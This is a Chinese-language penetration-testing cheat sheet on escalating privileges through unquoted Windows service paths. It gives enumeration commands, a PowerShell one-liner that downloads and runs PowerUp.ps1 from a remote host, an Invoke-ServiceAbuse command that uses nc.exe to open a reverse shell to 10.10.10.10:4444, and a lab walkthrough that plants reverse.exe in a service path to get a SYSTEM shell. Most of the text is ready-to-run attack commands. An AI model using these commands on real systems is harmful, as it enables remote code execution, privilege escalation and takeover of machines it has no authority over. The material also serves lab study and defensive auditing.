# 未引用的服务路径

利用方式：如果该路径未加引号并且包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。当使用不带引号并包含空格的绝对路径时，这种行为会导致歧义，由此导致攻击。

**MSF 利用：exploit/windows/local/trusted_service_path**

**错误配置枚举：**

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """

gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

PowerUp 枚举：

```bash
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://ip/PowerUp.ps1'); Invoke-AllChecks"
```

枚举结果如：

```bash
...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

例：如C:\Program Files\something\legit.exe，则windows的执行顺序是 `C:\Program.exe`  `C:\Program Files.exe`

# 案例：unquotedsvc服务

利用方式：若可以将自定义文件写入 c:\ 或 c:\Program Files 或 c:\Program Files\Unquoted Path Service，然后就可以进行错误引导。

```bash
sc qc unquotedsvc  // 1.可以看到二进制路径名包含空格 2.以SYSTEM权限运行
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"   //结果显示当前用户拥有文件所有访问权限
所以下一步可以将shell加入
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe" //用copy 加shell 加入至路径中
net start unquotedsvc 手动重启服务,得到反向shell
```